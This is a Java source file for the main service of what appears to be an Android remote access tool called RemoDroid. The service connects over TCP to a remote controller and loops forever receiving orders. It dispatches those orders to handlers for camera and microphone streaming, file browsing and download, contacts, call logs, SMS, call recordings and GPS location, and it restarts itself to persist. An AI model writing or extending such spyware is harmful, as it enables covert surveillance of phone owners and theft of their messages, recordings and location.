package com.remo;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import com.remo.connections.DataHandler;
import com.remo.connections.TCP_Transceiver;
import com.remo.features.*;

public class MainService extends Service {
    private Thread mainThread = null;
    private TCP_Transceiver tcp_transceiver;

    public MainService() {
    }
    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }


    private void init(){

        DataHandler.FeaturesClassesDict.clear();
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CAM.ordinal(),CamStream.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.MIC.ordinal(),MicStream.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.FM_LIST.ordinal(),FileMan.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.FM_DOWN.ordinal(),FileDownloader.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.INFO.ordinal(),MobileInfo.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CONTACTS.ordinal(),Contacts.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CALL_LOG.ordinal(),Call_Log.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.SMS.ordinal(),SMS.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CALL_RECORDS.ordinal(),CallRecordsList.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.GPS.ordinal(),GPS.class);
    }

    @Override
    public int onStartCommand(final Intent intent, int flags, int startId) {
        Log.d("REMODROID", "Main Service Started");

        mainThread = new Thread(new Runnable() {
            @Override
            public void run() {
                tcp_transceiver = new TCP_Transceiver(true);
                init();
                tcp_transceiver.connect();
                Log.d("REMODROID", "Receiving Orders");
                while (true) {
                    try {
                        String order = tcp_transceiver.receive();
                        Log.d("REMODROID", "Received " + order);

                        if (order != null) {
                            if (order.equals("")) {
                                init();
                                tcp_transceiver.connect();
                            }else if(order.equals("STOP:STOP:STOP")){

                                tcp_transceiver.disconnect();
                                Thread.sleep(1000);
                                init();
                                tcp_transceiver.connect();
                                //break;
                            }
                            else {
                                DataHandler.distribute(order, getApplicationContext());
                            }
                        }
                        else {
                            tcp_transceiver.disconnect();
                            Thread.sleep(5000);
                            init();
                            tcp_transceiver.connect();

                        }

                    } catch (Exception ex) {
                        Log.e("REMODROID","Receive Exception: " + ex.getMessage());
                        init();
                        tcp_transceiver.connect();
                        //break;
                    }
                }
            }
        });
        mainThread.setUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() {
            @Override
            public void uncaughtException(Thread t, Throwable e) {
                Log.e("REMODROID", "UncaughtException :" + e.getMessage());
                init();
                tcp_transceiver.connect();
            }
        });

        mainThread.start();

        return START_STICKY;
    }
    @Override
    public void onDestroy(){
        try {
            Log.d("REMODROID","Main Service Destroy ");
            mainThread.interrupt();
            super.onDestroy();
        }catch (Exception ex){
            Log.e("REMODROID","Main Service Destroy Exception: " + ex.getMessage());
        }
    }
}
